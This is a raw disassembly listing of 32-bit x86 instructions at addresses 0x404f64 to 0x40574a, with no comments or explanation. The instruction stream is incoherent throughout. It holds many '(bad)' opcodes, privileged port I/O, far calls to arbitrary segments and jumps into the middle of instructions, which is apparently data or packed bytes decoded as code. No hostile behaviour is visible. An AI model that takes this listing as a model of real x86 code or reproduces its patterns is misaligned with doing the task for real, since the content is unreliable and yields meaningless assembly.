  404f64:	rol    DWORD PTR [edx+0x46188810],1
  404f6a:	sar    DWORD PTR [edi-0x484d49b5],1
  404f70:	outs   dx,BYTE PTR ds:[esi]
  404f71:	outs   dx,DWORD PTR ds:[esi]
  404f72:	mov    edx,0x1e51bc45
  404f77:	push   ecx
  404f78:	jbe    0x404f5b
  404f7a:	popa   
  404f7b:	jb     0x404fb9
  404f7d:	mov    ds,WORD PTR [ebx]
  404f7f:	loopne 0x404f7a
  404f81:	fdiv   DWORD PTR ds:0xa74cacbd
  404f87:	int    0x6f
  404f89:	mov    ds:0x30ba1cf6,al
  404f8e:	pushf  
  404f8f:	ret    0x61d0
  404f92:	mov    dh,0x88
  404f94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f95:	cmp    ebx,ecx
  404f97:	lods   al,BYTE PTR ds:[esi]
  404f98:	push   eax
  404f99:	adc    bh,BYTE PTR [esi]
  404f9b:	xchg   ebx,eax
  404f9c:	pop    esi
  404f9d:	push   esi
  404f9e:	or     al,0xc2
  404fa0:	lock aam 0x76
  404fa3:	jmp    0x404fde
  404fa5:	out    0xe8,al
  404fa7:	and    dl,ch
  404fa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404faa:	fdecstp 
  404fac:	jae    0x404f6c
  404fae:	mov    bl,0x31
  404fb0:	mov    ch,0x2d
  404fb2:	dec    esi
  404fb3:	sahf   
  404fb4:	and    eax,esi
  404fb6:	out    0x45,eax
  404fb8:	jne    0x405028
  404fba:	lock dec ebx
  404fbc:	stc    
  404fbd:	xor    al,0x27
  404fbf:	call   0xa636:0x9ce882f5
  404fc6:	push   ds
  404fc7:	pop    edx
  404fc8:	outs   dx,DWORD PTR ds:[esi]
  404fc9:	push   esp
  404fca:	cmp    al,BYTE PTR [ecx-0x6a]
  404fcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fce:	sbb    al,0x7c
  404fd0:	mov    ds:0xa784b853,eax
  404fd5:	aas    
  404fd6:	xchg   esi,ecx
  404fd8:	cmp    ch,0x62
  404fdb:	lahf   
  404fdc:	xchg   edi,eax
  404fdd:	lods   al,BYTE PTR ds:[esi]
  404fde:	add    BYTE PTR [ebp-0x1ca56948],ah
  404fe4:	ficomp DWORD PTR [eax]
  404fe6:	(bad)  
  404fe7:	fmul   DWORD PTR [ebx]
  404fe9:	rol    BYTE PTR [ebx+0x2ccfc7bc],1
  404fef:	mov    esp,0x53ef2b08
  404ff4:	xor    DWORD PTR [edx-0x4c],eax
  404ff7:	jge    0x404faa
  404ff9:	push   ds
  404ffa:	jno    0x405038
  404ffc:	(bad)  
  404ffd:	jo     0x404ff5
  404fff:	daa    
  405000:	adc    ah,0x66
  405003:	push   ebp
  405004:	mov    ch,BYTE PTR ds:0x575b3260
  40500a:	fsub   DWORD PTR [ebx]
  40500c:	xor    BYTE PTR [edi+0x65],cl
  40500f:	std    
  405010:	or     DWORD PTR ds:0x9eae8c25,esi
  405016:	bound  ebx,QWORD PTR [ecx+0x7a322e7b]
  40501c:	ret    
  40501d:	adc    dh,BYTE PTR [eax-0x768bface]
  405023:	mov    dh,0x4c
  405025:	shr    DWORD PTR [ecx+0x23],0x4b
  405029:	ja     0x404fb5
  40502b:	or     al,0x93
  40502d:	into   
  40502e:	aaa    
  40502f:	add    al,0xe1
  405031:	out    0xa6,eax
  405033:	add    eax,0xcdaa1c46
  405038:	dec    edi
  405039:	pop    ss
  40503a:	btc    DWORD PTR [ebx],0xb1
  40503e:	stos   BYTE PTR es:[edi],al
  40503f:	stos   BYTE PTR es:[edi],al
  405040:	lods   eax,DWORD PTR ds:[esi]
  405041:	clc    
  405042:	les    edx,FWORD PTR [ebx-0x1ec5f5d]
  405048:	push   ecx
  405049:	cmp    eax,0x5a241650
  40504e:	call   0xb87:0x30d31cb0
  405055:	cmp    eax,0x38008f67
  40505a:	xchg   esp,eax
  40505b:	or     ebp,DWORD PTR [eax+0x2486a4aa]
  405061:	nop
  405062:	pop    edx
  405063:	inc    eax
  405064:	loop   0x4050c1
  405066:	push   ss
  405067:	test   BYTE PTR [edx+0x62],ch
  40506a:	cs shl esi,0xbb
  40506e:	xor    BYTE PTR [ebx-0x47],al
  405071:	xor    BYTE PTR [ebp-0x7ad05e7b],ah
  405077:	scas   eax,DWORD PTR es:[edi]
  405078:	mov    edi,ds
  40507a:	push   0x9599d205
  40507f:	push   esi
  405080:	fidivr WORD PTR [eax+0x22]
  405083:	mov    al,ch
  405085:	sub    eax,DWORD PTR [edi]
  405087:	fs out dx,eax
  405089:	(bad)  [esi]
  40508b:	push   cs
  40508c:	out    dx,al
  40508d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40508e:	in     al,0xdb
  405090:	jmp    0x405034
  405092:	sar    DWORD PTR [edi+0x0],0x2a
  405096:	pop    ebp
  405097:	je     0x405077
  405099:	push   esp
  40509a:	stos   BYTE PTR es:[edi],al
  40509b:	dec    ebx
  40509c:	xchg   ebp,eax
  40509d:	xchg   esi,eax
  40509e:	pop    ds
  40509f:	loop   0x405117
  4050a1:	jmp    0x40505c
  4050a3:	imul   esp,DWORD PTR [ebp-0x1],0x6e23edc1
  4050aa:	icebp  
  4050ab:	inc    ebp
  4050ac:	add    bl,BYTE PTR [edi]
  4050ae:	mov    esi,0xb6b0ad76
  4050b3:	je     0x405113
  4050b5:	xor    ebp,DWORD PTR [ecx-0x551a03a2]
  4050bb:	js     0x405126
  4050bd:	and    al,0x9
  4050bf:	sub    DWORD PTR [edx-0x683e36f8],ebp
  4050c5:	loop   0x4050b0
  4050c7:	lea    ebp,[edi]
  4050c9:	xchg   esi,eax
  4050ca:	fxch   st(7)
  4050cc:	pop    esp
  4050cd:	mov    edx,0x44f948cf
  4050d2:	in     eax,dx
  4050d3:	fsubr  st,st(4)
  4050d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050d6:	sub    BYTE PTR [edi],dl
  4050d8:	cmp    ah,ah
  4050da:	xor    BYTE PTR [eax+0x2e],al
  4050dd:	pop    ecx
  4050de:	ret    
  4050df:	ds jl  0x40514f
  4050e2:	adc    DWORD PTR [edx+0x26],0x28
  4050e6:	inc    ebx
  4050e7:	fs inc edx
  4050e9:	out    0xe3,al
  4050eb:	mov    WORD PTR [esi+ebx*4-0x6055ba0d],ss
  4050f2:	or     al,0x59
  4050f4:	pop    ds
  4050f5:	mov    edi,0xc2d0c6b5
  4050fa:	dec    eax
  4050fb:	add    al,0x8b
  4050fd:	xor    eax,0xe75e206c
  405102:	pop    edx
  405103:	mov    edi,0x369d3d3
  405108:	jnp    0x4050be
  40510a:	pop    esi
  40510b:	imul   edx,DWORD PTR [ecx-0x713a5ec2],0xa57c62f4
  405115:	cmp    ecx,DWORD PTR [ecx-0x51a4f342]
  40511b:	cmovnp esi,DWORD PTR [ecx-0x5126c367]
  405122:	out    dx,al
  405123:	inc    esp
  405124:	iret   
  405125:	shl    edx,cl
  405127:	loop   0x4050c3
  405129:	ss dec ebx
  40512b:	sub    ebp,DWORD PTR [ecx+0x74a11ef0]
  405131:	stc    
  405132:	or     DWORD PTR [edi-0x5ed9cbd1],ecx
  405138:	pop    eax
  405139:	mov    eax,0xac4e94b1
  40513e:	cmc    
  40513f:	pushf  
  405140:	cld    
  405141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405142:	jg     0x40516f
  405144:	xor    ecx,DWORD PTR [ebx]
  405146:	mov    eax,0x6a98b428
  40514c:	inc    ecx
  40514d:	xchg   ecx,eax
  40514e:	xor    BYTE PTR [ecx-0x7e00d124],cl
  405154:	push   edi
  405155:	mov    ebp,DWORD PTR [esi+0x19]
  405158:	mov    ecx,0xa759dbee
  40515d:	iret   
  40515e:	mov    fs,edi
  405160:	scas   eax,DWORD PTR es:[edi]
  405161:	(bad)  
  405162:	jecxz  0x405100
  405164:	mov    al,ds:0x56e4aea9
  405169:	aaa    
  40516a:	cli    
  40516b:	mov    esi,DWORD PTR [edx]
  40516d:	mov    ah,0xd7
  40516f:	lods   al,BYTE PTR ds:[esi]
  405170:	sets   BYTE PTR [ebp+0x5e967e2c]
  405177:	rol    BYTE PTR [esi-0x5b],0x56
  40517b:	das    
  40517c:	jp     0x405147
  40517e:	xchg   ch,cl
  405180:	jns    0x4051e4
  405182:	pop    edx
  405183:	jns    0x4051cf
  405185:	test   DWORD PTR [esi+0x5a],ecx
  405188:	pop    ss
  405189:	pop    eax
  40518a:	sub    edi,DWORD PTR [edx-0x76e9aed5]
  405190:	add    ebx,0x3662526a
  405196:	cld    
  405197:	push   ss
  405198:	lods   eax,DWORD PTR ds:[esi]
  405199:	jl     0x405165
  40519b:	jmp    0x4051fa
  40519d:	sub    al,0xb7
  40519f:	in     al,0x7c
  4051a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051a2:	xchg   bh,bl
  4051a4:	inc    ecx
  4051a5:	cmp    BYTE PTR [ebx+0x6cf95cd4],bl
  4051ab:	add    ch,ch
  4051ad:	push   esp
  4051ae:	test   DWORD PTR [ecx-0x43],edi
  4051b1:	test   eax,0x9a7b9514
  4051b6:	mov    al,fs:0xc042adb9
  4051bc:	or     esi,eax
  4051be:	mov    ds:0x7dbca02,al
  4051c3:	mov    eax,ds:0x2932d16a
  4051c8:	or     al,0xca
  4051ca:	cwde   
  4051cb:	mov    edx,0x3cea0a9d
  4051d0:	adc    BYTE PTR [ebx-0x77820082],bh
  4051d6:	pop    ebp
  4051d7:	sub    bl,BYTE PTR ds:0xc0f223d5
  4051dd:	sbb    BYTE PTR [ecx-0x63],bh
  4051e0:	lea    ebx,[edx+0x23abfffc]
  4051e6:	out    0x2e,eax
  4051e8:	in     eax,dx
  4051e9:	mov    DWORD PTR [ecx+0x7ded3aa3],edx
  4051ef:	outs   dx,BYTE PTR ds:[esi]
  4051f0:	loope  0x405214
  4051f2:	xchg   ebp,eax
  4051f3:	ret    0x7506
  4051f6:	in     eax,dx
  4051f7:	call   0x8a2a:0xa3b9f924
  4051fe:	bound  ebp,QWORD PTR [esi-0x4f8e99cc]
  405204:	in     al,dx
  405205:	xchg   BYTE PTR [edx],bh
  405207:	dec    esi
  405208:	mov    esi,0x74577e8c
  40520d:	repnz ds mov bh,0xb2
  405211:	sbb    BYTE PTR [edx-0x165a6f5],cl
  405217:	jmp    0x852deaa8
  40521c:	pop    ds
  40521d:	mov    bl,dl
  40521f:	jl     0x405283
  405221:	fadd   st(7),st
  405223:	(bad)  
  405225:	mov    eax,DWORD PTR [esp+ebx*4]
  405228:	jecxz  0x405211
  40522a:	xchg   BYTE PTR [edx-0x6a4dd9e4],cl
  405230:	jmp    0x9437b497
  405235:	mov    ecx,0xa327fdb0
  40523a:	sbb    ebp,DWORD PTR [ebp+ebx*4-0x40]
  40523e:	xor    eax,0xcedd2146
  405243:	fs and eax,0xb10d596e
  405249:	mov    esi,0x2b975185
  40524e:	mov    bh,0x67
  405250:	pop    edi
  405251:	dec    ebx
  405252:	sub    dl,bh
  405254:	pop    eax
  405255:	cld    
  405256:	test   BYTE PTR [edi+0x6f],dh
  405259:	in     al,dx
  40525a:	push   esp
  40525b:	sbb    eax,0x8072aa01
  405260:	test   DWORD PTR [eax+0x6b6dd2a1],0x4893bac0
  40526a:	sbb    eax,0x24664b69
  40526f:	push   cs
  405270:	dec    ebp
  405271:	mov    bl,0x2f
  405273:	sub    ah,dl
  405275:	sbb    eax,edx
  405277:	mov    ah,0x20
  405279:	mov    bl,BYTE PTR [edx-0x5d22ec8b]
  40527f:	mov    esi,0x1558f7e5
  405284:	push   ecx
  405285:	popa   
  405286:	test   DWORD PTR [ebx+eiz*4-0x598a67d1],0x7d6270b
  405291:	in     eax,dx
  405292:	xchg   ebp,eax
  405293:	mov    bh,0xa5
  405295:	push   ss
  405296:	push   ebp
  405297:	adc    ah,ah
  405299:	js     0x405289
  40529b:	pop    ebx
  40529c:	sbb    BYTE PTR [ebp+0x17aa439a],bh
  4052a2:	in     eax,0xda
  4052a4:	call   FWORD PTR [ecx]
  4052a6:	fistp  QWORD PTR [ebp-0x74]
  4052a9:	inc    esp
  4052aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052ab:	fiadd  DWORD PTR [esp+edx*2]
  4052ae:	jg     0x4052d7
  4052b0:	mov    DWORD PTR [edi],0x7af619c3
  4052b6:	(bad)  
  4052b7:	fucomi st,st(3)
  4052b9:	inc    edi
  4052ba:	and    DWORD PTR [edi-0x98d2f92],edi
  4052c0:	sahf   
  4052c1:	scas   al,BYTE PTR es:[edi]
  4052c2:	inc    ecx
  4052c3:	cli    
  4052c4:	pop    es
  4052c5:	aad    0x74
  4052c7:	and    eax,0xb65559b3
  4052cc:	mov    dh,0xf8
  4052ce:	rol    BYTE PTR [edi+0x72],0xb1
  4052d2:	out    0x1f,al
  4052d4:	mov    edi,0x1a0daf2b
  4052d9:	out    0x3e,al
  4052db:	xor    DWORD PTR [edi-0x12b19ffe],eax
  4052e1:	mov    ds:0x447351a0,eax
  4052e6:	mov    ds:0xd84b53d,eax
  4052eb:	int    0x2b
  4052ed:	arpl   WORD PTR ds:0x129b1361,cx
  4052f3:	or     BYTE PTR [ebp-0x60],0xbf
  4052f7:	call   0x4089:0x788abb4f
  4052fe:	into   
  4052ff:	add    al,0xc2
  405301:	(bad)  
  405302:	push   eax
  405303:	xor    BYTE PTR [ebp+eiz*8+0x5f],bl
  405307:	fiadd  WORD PTR [ecx]
  405309:	pop    ecx
  40530a:	pop    esi
  40530b:	in     eax,0x35
  40530d:	or     al,BYTE PTR [ebx-0x41cf8d6b]
  405313:	push   ss
  405314:	call   0x79f9:0x829429f8
  40531b:	xchg   ebp,eax
  40531c:	lahf   
  40531d:	leave  
  40531e:	jecxz  0x4052f6
  405320:	repz data16 cmc 
  405323:	stos   BYTE PTR es:[edi],al
  405324:	xor    al,BYTE PTR [ebx-0x28]
  405327:	or     BYTE PTR [edx+0x27e1fc0d],bl
  40532d:	(bad)  
  40532e:	jmp    0x40531a
  405330:	mov    cl,0x16
  405332:	adc    eax,eax
  405334:	add    DWORD PTR [eax+0x22],ecx
  405337:	jp     0x405314
  405339:	aam    0xe3
  40533b:	add    ch,BYTE PTR [ebp+ecx*2+0x7ef4a30e]
  405342:	aam    0x9d
  405344:	sbb    BYTE PTR [edi-0x23],dl
  405347:	add    eax,0xf5e45088
  40534c:	sbb    DWORD PTR gs:[edx-0x24d7c9ed],eax
  405353:	sub    BYTE PTR [esp+edi*2-0xd],0x3b
  405358:	inc    ebx
  405359:	mov    ebp,0x3a581e3f
  40535e:	js     0x405303
  405360:	inc    dh
  405362:	pop    esp
  405363:	sub    al,0x9a
  405365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405366:	add    al,0x63
  405368:	lds    edx,FWORD PTR ds:[edi-0x5f]
  40536c:	jl     0x405315
  40536e:	(bad)  
  405370:	and    eax,0x3730ec2d
  405375:	ror    DWORD PTR [esi-0x20b0bd25],0x18
  40537c:	mov    ds:0xe892d021,al
  405381:	ret    0xbd4f
  405384:	mov    eax,0xd6c569dc
  405389:	rol    BYTE PTR [edx],1
  40538b:	or     ah,BYTE PTR [edx]
  40538d:	mov    eax,0x66fe84f9
  405392:	pusha  
  405393:	mov    dl,0xbd
  405395:	rcr    DWORD PTR ds:0x5e277d73,0x1f
  40539c:	jne    0x40538f
  40539e:	rol    DWORD PTR [esi],cl
  4053a0:	aaa    
  4053a1:	into   
  4053a2:	test   DWORD PTR [edi],esp
  4053a4:	cmp    DWORD PTR [edi-0x1c9fed22],esp
  4053aa:	or     ch,dl
  4053ac:	fstp   TBYTE PTR [esi-0x67]
  4053af:	inc    ecx
  4053b0:	rcr    edx,1
  4053b2:	(bad)  
  4053b3:	xor    al,0xaa
  4053b5:	rcl    BYTE PTR [eax],0x65
  4053b8:	aas    
  4053b9:	jmp    0x4053c9
  4053bb:	jl     0x405386
  4053bd:	xchg   al,dh
  4053bf:	adc    DWORD PTR [edx],esi
  4053c1:	ins    BYTE PTR es:[edi],dx
  4053c2:	mov    bh,0xe8
  4053c4:	enter  0x1e76,0xab
  4053c8:	mov    dl,0x9e
  4053ca:	jno    0x405410
  4053cc:	(bad)  
  4053cd:	fisubr WORD PTR [ecx+0x5a2d3a4e]
  4053d3:	push   cs
  4053d4:	push   ebp
  4053d5:	push   esp
  4053d6:	fsub   QWORD PTR [ebx-0x6f504cbb]
  4053dc:	fs test eax,0x1c97c695
  4053e2:	add    eax,0xd0af7d26
  4053e7:	mov    ds:0xb5f09eae,al
  4053ec:	out    dx,eax
  4053ed:	(bad)  
  4053ee:	jae    0x405445
  4053f0:	and    BYTE PTR fs:[edx+0x11a570d9],0xb3
  4053f8:	ret    
  4053f9:	enter  0xee9c,0xaf
  4053fd:	int    0xb
  4053ff:	aas    
  405400:	xchg   edi,eax
  405401:	mov    eax,ds:0x4ffc42b0
  405406:	out    dx,al
  405407:	ins    BYTE PTR es:[edi],dx
  405408:	and    ebx,DWORD PTR [edx-0x2a]
  40540b:	loop   0x40539c
  40540d:	pop    edi
  40540e:	stc    
  40540f:	cmp    esp,eax
  405411:	mov    ebp,fs
  405413:	jb     0x40546f
  405415:	les    esi,FWORD PTR [ecx]
  405417:	pop    ebp
  405418:	mov    ch,0xee
  40541a:	pop    esi
  40541b:	ins    BYTE PTR es:[edi],dx
  40541c:	and    ch,ah
  40541e:	pop    edx
  40541f:	std    
  405420:	sub    bh,BYTE PTR fs:[ecx]
  405423:	int    0x76
  405425:	adc    al,0x9c
  405427:	mov    dl,0xad
  405429:	mul    BYTE PTR [edi]
  40542b:	enter  0x6d91,0xf1
  40542f:	bound  edx,QWORD PTR [esi-0x4bb64eb4]
  405435:	inc    edi
  405436:	rcl    ebp,1
  405438:	and    BYTE PTR [ebx+0x57],ah
  40543b:	call   0x29d14736
  405440:	enter  0xa2e2,0x39
  405444:	xchg   esp,eax
  405445:	scas   al,BYTE PTR es:[edi]
  405446:	mov    cl,0x13
  405448:	inc    edi
  405449:	jecxz  0x405488
  40544b:	and    BYTE PTR [ebp-0x49e2fee8],al
  405451:	xor    dl,BYTE PTR [edi+eiz*4+0x3f410c15]
  405458:	xchg   di,ax
  40545a:	or     dh,BYTE PTR [ebp-0x1386e9c9]
  405460:	pop    edx
  405461:	xchg   BYTE PTR [esi],dh
  405463:	mov    edi,0x1dab89cf
  405468:	mov    bh,BYTE PTR [ebx]
  40546a:	lea    edi,[esi]
  40546c:	add    bh,dl
  40546e:	fldcw  WORD PTR [esi]
  405470:	int3   
  405471:	jmp    0x405406
  405473:	or     al,0x32
  405475:	int3   
  405476:	adc    dl,bl
  405478:	jbe    0x405408
  40547a:	repz scas al,BYTE PTR es:[edi]
  40547c:	jmp    0x405432
  40547e:	sbb    ch,BYTE PTR [edx-0xb]
  405481:	in     eax,0xbb
  405483:	aaa    
  405484:	aas    
  405485:	push   es
  405486:	mov    esi,0xb6bb058d
  40548b:	cmp    DWORD PTR [ebx-0x57],ecx
  40548e:	retf   
  40548f:	retf   0x45b
  405492:	inc    ebp
  405493:	inc    esi
  405494:	sbb    eax,0xcd2f9ac3
  405499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40549a:	jp     0x4054cc
  40549c:	cs stos BYTE PTR es:[edi],al
  40549e:	push   0x625e5dc7
  4054a3:	jmp    0xfda16bd4
  4054a8:	ss pop ebx
  4054aa:	std    
  4054ab:	fwait
  4054ac:	dec    ebp
  4054ad:	jecxz  0x4054cc
  4054af:	out    0xd4,eax
  4054b1:	fadd   st(0),st
  4054b3:	mov    edx,0xf23c8e3
  4054b8:	fmulp  st(4),st
  4054ba:	inc    ebp
  4054bb:	pushf  
  4054bc:	mov    dl,0xe9
  4054be:	jno    0x405505
  4054c0:	loope  0x40547f
  4054c2:	outs   dx,DWORD PTR ds:[esi]
  4054c3:	push   ebp
  4054c4:	lods   al,BYTE PTR ds:[esi]
  4054c5:	ret    
  4054c6:	xchg   esp,eax
  4054c7:	ins    BYTE PTR es:[edi],dx
  4054c8:	sahf   
  4054c9:	adc    bh,bl
  4054cb:	mov    al,0xc7
  4054cd:	shl    DWORD PTR [ebx+0x44],1
  4054d0:	lods   al,BYTE PTR ds:[esi]
  4054d1:	or     BYTE PTR [edx+0x3],bl
  4054d4:	pop    ecx
  4054d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054d6:	sbb    edx,DWORD PTR [ebx]
  4054d8:	xor    DWORD PTR [ebp+0x24],edi
  4054db:	jbe    0x405468
  4054dd:	jnp    0x4054fb
  4054df:	ret    
  4054e0:	push   edx
  4054e1:	mov    ds:0xfb73627a,eax
  4054e6:	dec    edx
  4054e7:	sbb    ch,0xbc
  4054ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054eb:	fstp   DWORD PTR [edi]
  4054ed:	hlt    
  4054ee:	jb     0x4054ce
  4054f0:	pop    ebx
  4054f1:	stos   BYTE PTR es:[edi],al
  4054f2:	jmp    0x46ec:0x94be5ade
  4054f9:	sahf   
  4054fa:	into   
  4054fb:	arpl   WORD PTR [edx+0x16],bx
  4054fe:	cwde   
  4054ff:	stc    
  405500:	xor    WORD PTR [ebx],si
  405503:	loopne 0x40548f
  405505:	adc    al,0xd5
  405507:	bound  esp,QWORD PTR [ecx-0x3a28038d]
  40550d:	pop    ebx
  40550e:	scas   al,BYTE PTR es:[edi]
  40550f:	mov    eax,ds:0x37ebe2a4
  405514:	sub    eax,0x53ab9409
  405519:	es je  0x4054cc
  40551c:	aaa    
  40551d:	std    
  40551e:	adc    DWORD PTR [ebx+0x39],ecx
  405521:	test   DWORD PTR [ecx+0x16bd676e],ecx
  405527:	pop    ds
  405528:	bound  edi,QWORD PTR [ebp+0x4b]
  40552b:	xor    al,0xb7
  40552d:	jo     0x405503
  40552f:	dec    edx
  405530:	push   edx
  405531:	in     al,dx
  405532:	inc    esp
  405533:	test   eax,0x9ca40be6
  405538:	xor    al,0x2c
  40553a:	repz mov esi,0xf82f3c68
  405540:	adc    dh,BYTE PTR [esi]
  405542:	xchg   ebx,eax
  405543:	push   edi
  405544:	mov    eax,ds:0x2671dc6a
  405549:	rol    DWORD PTR [esi-0x69dd8695],cl
  40554f:	(bad)  
  405550:	outs   dx,DWORD PTR ds:[esi]
  405551:	les    edx,FWORD PTR [edx+0x58]
  405554:	add    cl,BYTE PTR [edi]
  405556:	add    al,0x9c
  405558:	shl    DWORD PTR [esi+0x1711f6ce],1
  40555e:	(bad)
  405562:	arpl   WORD PTR [edx-0x1c],bx
  405565:	in     al,dx
  405566:	push   cs
  405567:	ror    BYTE PTR [edx+0x1e],0xa3
  40556b:	int3   
  40556c:	mov    esp,0xdc30e09d
  405571:	rol    DWORD PTR [esi+0x3f],cl
  405574:	sub    DWORD PTR [esi+0x10],edi
  405577:	cmp    bh,dl
  405579:	jbe    0x405582
  40557b:	(bad)  
  40557d:	and    BYTE PTR [ebp+0x7c7203cb],dh
  405583:	pop    ss
  405584:	and    BYTE PTR [eax+0x3a],ah
  405587:	xor    al,0x48
  405589:	jno    0x40559f
  40558b:	adc    edx,DWORD PTR [ebp+ecx*1+0x7b]
  40558f:	or     al,0x81
  405591:	mov    WORD PTR [eax+esi*4+0x2c],cs
  405595:	mov    ebx,0xc8022d1
  40559a:	xchg   ecx,ecx
  40559c:	sub    dh,BYTE PTR [edi-0x9f24c90]
  4055a2:	sahf   
  4055a3:	push   ecx
  4055a4:	xchg   edi,eax
  4055a5:	push   cx
  4055a7:	ror    ecx,cl
  4055a9:	inc    ecx
  4055aa:	mov    edx,0x6d24d36d
  4055af:	mov    ebp,DWORD PTR [eax+0x619e749a]
  4055b5:	ror    DWORD PTR [edx],cl
  4055b7:	lahf   
  4055b8:	pop    es
  4055b9:	dec    ebp
  4055ba:	sbb    DWORD PTR [ecx+esi*4],ebx
  4055bd:	icebp  
  4055be:	xor    dl,BYTE PTR [edi-0x5]
  4055c1:	aam    0x40
  4055c3:	popa   
  4055c4:	xchg   esi,eax
  4055c5:	jo     0x405563
  4055c7:	enter  0x5f70,0xde
  4055cb:	test   DWORD PTR [ecx+0x0],esp
  4055ce:	push   ecx
  4055cf:	pop    edx
  4055d0:	inc    ebx
  4055d1:	test   eax,0x8c389aaa
  4055d6:	cmp    edx,esi
  4055d8:	pop    DWORD PTR [edx+0x74553f9e]
  4055de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055df:	push   eax
  4055e0:	push   ebx
  4055e1:	mov    esi,0x3e256ef4
  4055e6:	pop    esp
  4055e7:	push   eax
  4055e8:	cmp    eax,edx
  4055ea:	inc    eax
  4055eb:	adc    edi,ebp
  4055ed:	pop    ds
  4055ee:	(bad)  
  4055ef:	test   al,0x24
  4055f1:	out    dx,eax
  4055f2:	dec    eax
  4055f3:	and    al,BYTE PTR [edx]
  4055f5:	popa   
  4055f6:	cmp    DWORD PTR [eax+eax*8],esp
  4055f9:	add    edx,DWORD PTR [edi+0x4f785b8e]
  4055ff:	jmp    0x4055d3
  405601:	iret   
  405602:	neg    ebp
  405604:	int    0xf9
  405606:	fisubr WORD PTR [edx]
  405608:	or     bl,BYTE PTR [ebx-0x20]
  40560b:	xor    al,BYTE PTR [edi+0x6ddc32da]
  405611:	push   edi
  405612:	xchg   ebp,eax
  405613:	addr16 mov ebp,0xfa078e31
  405619:	ret    
  40561a:	daa    
  40561b:	dec    edx
  40561c:	push   edx
  40561d:	sub    al,0x7c
  40561f:	into   
  405620:	imul   esp,ebx,0x33f00847
  405626:	dec    ebp
  405627:	mov    ch,0x4c
  405629:	inc    edx
  40562a:	mov    DWORD PTR ds:0x33b52a72,esi
  405630:	std    
  405631:	push   edx
  405632:	ss mov ecx,0x97f36919
  405638:	int3   
  405639:	fadd   DWORD PTR [ebp+0x6]
  40563c:	mov    ah,0x78
  40563e:	adc    DWORD PTR ds:0xef93a01c,0x9fbcf285
  405648:	push   esi
  405649:	jb     0x4056a1
  40564b:	scas   eax,DWORD PTR es:[edi]
  40564c:	outs   dx,BYTE PTR ds:[esi]
  40564d:	or     BYTE PTR [edx],0x81
  405650:	jo     0x4055ea
  405652:	or     al,0xc1
  405654:	fidivr DWORD PTR [ebx]
  405656:	jle    0x4055eb
  405658:	cmp    ecx,0xffffffc0
  40565b:	or     DWORD PTR [eax-0x4c],0x38569290
  405662:	test   al,0xa5
  405664:	bound  edi,QWORD PTR [ebx+0x5f24bb57]
  40566a:	xor    ebp,esp
  40566c:	je     0x4056db
  40566e:	sub    edx,edx
  405670:	pusha  
  405671:	xor    ah,BYTE PTR [ebp+0x25]
  405674:	stos   DWORD PTR es:[edi],eax
  405675:	scas   al,BYTE PTR es:[edi]
  405676:	jb     0x4056c2
  405678:	dec    esi
  405679:	jge    0x405618
  40567b:	vmulps ymm6,ymm6,YMMWORD PTR [eax+0x8]
  405680:	lds    esp,FWORD PTR [esi+0x34]
  405683:	or     eax,0xf75de32f
  405688:	inc    edi
  405689:	jmp    0xab01dfc8
  40568e:	ins    DWORD PTR es:[edi],dx
  40568f:	sbb    al,0x60
  405691:	pop    ecx
  405692:	hlt    
  405693:	mov    al,BYTE PTR ds:0x2835a63
  405699:	lea    esp,[eax]
  40569b:	call   0x1d7:0xcaf2919c
  4056a2:	push   ecx
  4056a3:	jno    0x405713
  4056a5:	cli    
  4056a6:	inc    esp
  4056a7:	int3   
  4056a8:	push   ds
  4056a9:	test   al,0x39
  4056ab:	out    dx,al
  4056ac:	int3   
  4056ad:	inc    esi
  4056ae:	push   0x2229597e
  4056b3:	(bad)  
  4056b4:	into   
  4056b5:	lods   al,BYTE PTR ds:[esi]
  4056b6:	inc    edx
  4056b7:	popa   
  4056b8:	adc    eax,0x295a7f7d
  4056bd:	pop    ebx
  4056be:	xor    al,bl
  4056c0:	and    cl,BYTE PTR [edx+0x4308b8ce]
  4056c6:	js     0x405721
  4056c8:	(bad)
  4056cb:	mov    WORD PTR [edx-0x54],fs
  4056ce:	push   0x2d
  4056d0:	pop    ecx
  4056d1:	mov    edx,DWORD PTR [ebp-0x3b]
  4056d4:	sub    BYTE PTR [eax+0x646dfd36],0xe5
  4056db:	add    eax,0x139e9299
  4056e0:	inc    eax
  4056e1:	push   0xffffffef
  4056e3:	jecxz  0x405740
  4056e5:	cwde   
  4056e6:	add    edx,DWORD PTR ss:[ebx-0x401309bb]
  4056ed:	rol    BYTE PTR [edi+0x3e],0xf3
  4056f1:	lahf   
  4056f2:	pop    es
  4056f3:	clc    
  4056f4:	pop    ds
  4056f5:	in     al,0x38
  4056f7:	sahf   
  4056f8:	push   ecx
  4056f9:	outs   dx,DWORD PTR ds:[esi]
  4056fa:	pop    ebp
  4056fb:	cmp    edx,DWORD PTR [ebx-0x10]
  4056fe:	out    0xe5,al
  405700:	scas   al,BYTE PTR es:[edi]
  405701:	mov    ds:0xfeb2f304,eax
  405706:	iret   
  405707:	(bad)  
  405708:	retw   0xbacc
  40570c:	jbe    0x4056ae
  40570e:	mov    al,ds:0x8b16ae60
  405713:	popa   
  405714:	push   edi
  405715:	jmp    0x6dba:0xae38d45f
  40571c:	mov    esi,0x73bde73e
  405721:	mov    cl,BYTE PTR [ebp+0x34]
  405724:	fs stos DWORD PTR es:[edi],eax
  405726:	push   esi
  405727:	nop
  405728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405729:	and    esi,DWORD PTR [esi+0x50]
  40572c:	mov    esp,0x54caab05
  405731:	and    eax,0x5fcdb49c
  405736:	loopne 0x405714
  405738:	sub    BYTE PTR [ebp-0x3b],0x32
  40573c:	cmp    ah,0x25
  40573f:	cmp    eax,0xaf01b907
  405744:	mov    edx,0xbf6834e9
  405749:	clc    
  40574a:	cs dec eax
